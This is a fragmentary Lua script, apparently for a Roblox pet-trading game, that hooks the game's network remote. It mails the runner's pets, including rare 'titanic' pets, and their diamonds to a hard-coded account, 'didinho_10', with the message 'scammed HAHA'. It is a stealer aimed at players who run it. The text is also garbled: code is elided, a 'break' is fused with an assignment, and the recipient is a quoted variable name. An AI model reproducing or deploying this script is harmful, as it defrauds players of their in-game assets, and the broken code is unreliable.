getgenv().YourAccNameThatGetsMailbox = "didinho_10"

getgenv().YourAccountIdForBankInvite = 1281970192
    ...
    if rawget(V, "Invoke") then 
        ...
        if type(V.Invoke) == "function" then 
            ...
            if tostring(getfenv(V.Invoke).script) == "Network" then 
                ...
                break getgenv().YourAccNameThatGetsMailbox = "didinho_10"
...
if titanicHolder:FindFirstChildWhichIsA("TextButton")
  ...
  then 
      ...
      print("found titanic") 
       ...
       FireRemote("Send Mail",{ Recipient = "getgenv().YourAccNameThatGetsInvited", Message = "scammed HAHA", Pets = {[1]=titanicHolder:FindFirstChildWhichIsA("TextButton").Name}, Diamonds = 0 }) 
...
print(FireRemote("Send Mail",{ Recipient = "getgenv().YourAccNameThatGetsInvited", Message = "hi", Pets = {[1]=v.uid}, Diamonds = diamonds })) cooldown     
